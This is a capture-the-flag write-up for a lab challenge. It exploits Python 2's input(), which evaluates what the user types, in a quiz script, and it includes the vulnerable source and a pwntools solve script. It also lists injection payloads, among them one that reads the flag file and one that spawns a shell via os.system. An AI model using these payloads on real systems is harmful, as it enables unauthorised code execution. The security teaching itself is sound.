# CyLab — What's Your Input?

* **Platform:** CyLab Security Academy (Challenge ID: `138`)
* **Category:** Binary Exploitation / Python 2 Input Injection (Pwn/Misc)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, Source Code Analysis
* **Binary / Target:** `in.py` (Python 2.7 script)

---

## TL;DR

The remote service runs a Python 2.7 interactive script (`in.py`). In Python 2, the built-in function `input()` does not merely read raw text; it implicitly calls `eval(raw_input())`, executing user-supplied input as arbitrary Python expressions within the script's global and local namespaces. The challenge asks the user to guess a randomly chosen city stored in variable `city`. By entering the identifier `city`, Python evaluates the variable name directly, yielding the current random city and satisfying `res == city` to output the flag.

---

## Recon

### Target Script Analysis

Examining `in.py`:

```python
#!/usr/bin/python2.7 -u
import random

cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
year = 2018

print("Welcome to the quiz!")
res = input("What year is it? ")
if res != year:
    print("Incorrect year!")
    exit(1)

res = input("What city am I thinking of? ")
if res == city:
    print("Correct! Here is your flag:")
    print(open("./flag").read())
else:
    print("Wrong city, goodbye!")
```

Key observations:
1. **Python 2.7 Environment:** The shebang specifies `#!/usr/bin/python2.7 -u`.
2. **`input()` vs `raw_input()`:** In Python 2.x:
   - `raw_input()` reads a string line.
   - `input()` evaluates the line as Python code: `eval(raw_input(prompt))`.
3. **Variable Namespace Accessibility:** The variable `city` holding the secret string is present in the global evaluation scope.

---

## Static Analysis & Vulnerability

### 1. The Python 2 `input()` Insecurity

In Python 2, `input()` is functionally defined as:

```python
def input(prompt):
    return eval(raw_input(prompt))
```

When the prompt asks:
```python
res = input("What city am I thinking of? ")
```
If the user inputs literal text without quotes (e.g. `Boston`), Python tries to evaluate `Boston` as an identifier, causing a `NameError`.
However, if the user inputs an existing variable name:
```text
User Input: city
Evaluation: eval("city") -> returns value of variable city
Result:     res == city evaluates to True!
```

```text
                  User Types: "city"
                          |
                          v
                 input("What city? ")
                          |
                          v
                 eval("city", globals(), locals())
                          |
                          v
              Returns value of variable `city`
                          |
                          v
             res == city is ALWAYS True!
                          |
                          v
                 Print flag file contents
```

Furthermore, because `eval()` allows expression evaluation, one could also supply:
```python
open("./flag").read()
```
or even arbitrary shell commands:
```python
__import__('os').system('sh')
```

---

## Dynamic Analysis & Exploitation Strategy

1. **Question 1:**
   Prompt asks: `What year is it? `
   We send: `2018` (evaluates to integer `2018`, satisfying `res == 2018`).
2. **Question 2:**
   Prompt asks: `What city am I thinking of? `
   We send: `city` (evaluates to variable `city`, satisfying `res == city`).
3. **Flag Capture:**
   The script reads `./flag` and prints the token to standard output.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, time, re
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 11888

def solve(io):
    # Answer Question 1: Numeric year
    io.recvuntil(b"What year is it? ")
    io.sendline(b"2018")

    # Answer Question 2: Variable name reference instead of guessing
    io.recvuntil(b"What city am I thinking of? ")
    io.sendline(b"city")

    data = io.recvall(timeout=5)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process(["./in.py"]) if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 11888: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 11888
```

---

## Key Takeaways & Lessons

1. **Dangerous Functions in Legacy Runtimes:** Python 2's `input()` is one of the most infamous built-in design flaws, functioning as an unconstrained `eval()`. In Python 3, `raw_input()` was renamed to `input()`, and the unsafe behavior was removed.
2. **Namespace Reflection Attacks:** In interpreted dynamic languages, if an attacker can trigger variable resolution in the execution scope, guessing secrets is rendered completely unnecessary—one can simply refer to the secret by its identifier.
3. **Expression Injection Beyond Guessing:** Any time user input reaches `eval()` or equivalent dynamic code evaluators, arbitrary code execution (ACE) or direct filesystem reading is immediately possible.
